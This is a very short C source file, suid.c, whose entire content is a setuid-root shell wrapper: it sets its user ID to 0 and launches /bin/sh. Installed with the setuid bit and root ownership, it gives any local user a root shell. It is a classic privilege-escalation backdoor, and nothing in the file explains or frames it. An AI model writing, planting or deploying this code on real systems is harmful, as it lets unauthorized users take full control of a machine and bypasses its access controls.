/* suid.c */

#include <sys/types.h>
#include <unistd.h>


main()
{
  setuid(0);
  execl("/bin/sh", " sh", NULL);
  exit(1);
}
